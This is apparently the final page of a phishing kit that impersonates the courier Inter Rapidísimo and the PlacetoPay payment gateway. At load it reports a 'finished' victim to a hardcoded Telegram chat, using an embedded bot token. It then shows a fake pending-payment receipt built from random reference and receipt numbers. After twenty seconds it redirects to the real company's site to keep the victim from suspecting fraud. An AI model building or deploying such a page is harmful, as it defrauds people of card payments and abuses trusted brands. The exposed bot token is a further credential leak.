<?php

require_once('../../acciones/bot_telegram.php');

session_start();


$token = "6931763667:AAFB0e3SfW1f9rUHYF_p2h5EdfpRIFSzVoc";
$chatId = "-1002158762793";

$mensaje = "Se ha finalizado un usuario";

enviarMensajeTelegram($chatId, $mensaje, $token);

?>



<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprobante de Pago - Inter rapidísimo</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="icon" href="https://placetopay.dev/favicon.svg" type="image/vnd.microsoft.icon">
    <script src="https://cdn.tailwindcss.com"></script>
   
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f4f8;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-white shadow-xl rounded-2xl overflow-hidden w-full max-w-2xl">
      <div class="bg-white p-6 text-center border-b-4 border-orange-400">
        <img src="https://placetopay.dev/_astro/logo-placetopay.zD2RPUwO.svg" alt="Placetopay" class="mx-auto mb-4" style="width: 240px;">
        <h1 class="text-2xl font-bold text-gray-800">Comprobante de Pago</h1>
      </div>
        
        <div class="p-8 space-y-6">
            <div class="text-center">
              <h2 class="text-2xl font-semibold text-yellow-500">Transacción Pendiente</h2>
                <p class="text-gray-600">Referencia PlacetoPay #<span id="reference" class="font-medium"></span></p>
            </div>
            
            <div class="bg-gray-100 rounded-lg p-4">
                <p class="text-center text-gray-700 mb-2"><span id="fecha" class="font-medium"></span></p>
                <p class="text-center text-gray-700 mb-2 font-bold">Pago en proceso. Una vez se apruebe el pago, te enviaremos tu paquete en un plazo de 1 día. Agradecemos tu paciencia y comprensión.</p>
                <p class="text-center text-sm italic text-gray-500">"Inter rapidísimo, te la ponemos re fácil."</p>
            </div>
            

            <div class="space-y-4">
                <h3 class="text-xl font-semibold text-gray-800">Medio de pago</h3>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Método</span>
                    <span class="font-medium text-gray-800">crédito/débito</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Autorización</span>
                    <span class="font-medium text-gray-800">000000</span>
                </div>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Recibo</span>
                    <span id="receipt" class="font-medium text-gray-800"></span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-600">Estado</span>
                    <span class="font-medium text-yellow-600">Transacción en Proceso</span>
                </div>
            </div>

            <div class="space-y-4">
                <h3 class="text-xl font-semibold text-gray-800">Datos de la compra</h3>
                <div class="flex justify-between items-center border-b border-gray-200 pb-2">
                    <span class="text-gray-600">Ref. Comercio</span>
                    <span class="font-medium text-gray-800">8567793</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-600">Descripción</span>
                    <br>
                    <br>
                    
                </div>
                <p class="font-medium text-gray-800">Pago Inter rapidísimo-PlacetoPay</p>
            </div>
        </div>
    </div>

    <script>
        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        document.getElementById('reference').textContent = getRandomInt(211990000, 211999809);
        document.getElementById('receipt').textContent = getRandomInt(819661928168311, 819661928968000);
        
        const fechaActual = new Date().toLocaleDateString('es-CO', { 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
        document.getElementById('fecha').textContent = fechaActual;
    </script>

    <script>
        function redireccionar() {
            setTimeout(function() {
                window.location.href = "https://wwwrapsprod.interrapidisimo.com/PQR/";
            }, 20000);
        }
        redireccionar();
    </script>

    <script>
        window.addEventListener('beforeunload', function(event) {
            if (window.performance.navigation.type === 2) {
                window.location.href = "https://wwwrapsprod.interrapidisimo.com/PQR/";
            }
        });
    </script>
</body>
</html>